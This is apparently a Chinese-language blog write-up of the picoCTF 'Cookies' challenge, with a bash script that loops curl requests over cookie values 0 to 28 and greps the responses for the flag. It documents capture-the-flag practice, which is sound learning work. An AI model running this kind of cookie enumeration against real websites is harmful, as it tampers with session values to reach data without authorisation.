+++
title = "pioCTF - Cookies"
template = "page.html"
date = 2021-07-01T20:09:27+08:00
[taxonomies]
tags = ["ctf"]
[extra]
summary = "40 Points"
+++

這一題標題就非常明示的，這是跟 Cookies 有關係。
打開網址首先會看到一個輸入匡跟搜尋按鈕，輸入匡裡還有 placeholder 寫著 snickerdoodle。直接輸入 snickerdoodle

會出現 I love snickerdoodle cookies!

打開瀏覽器開發工具，找出 Cookies 會發現寫了一筆 `name = 0` 的 Cookie ，以此類推，可能會有 1, 2, 3... 的 cookies。

接下來 curl 是工程師的好朋友，寫一隻 Shell Script。因為 Flag 有某些特徵，所以我用 Grep 去過濾掉不要的資訊。

```bash
#!/bin/bash

set -B
for i in {0..28}; do
  curl -v --silent 'http://picoctf/check' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://picoctf/check' -H 'Cookie: name='$i -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' 2>&1 | grep pico
done
```

這題分數雖然不高，其實也真的不難，但寫 Shell Script 蠻有趣的。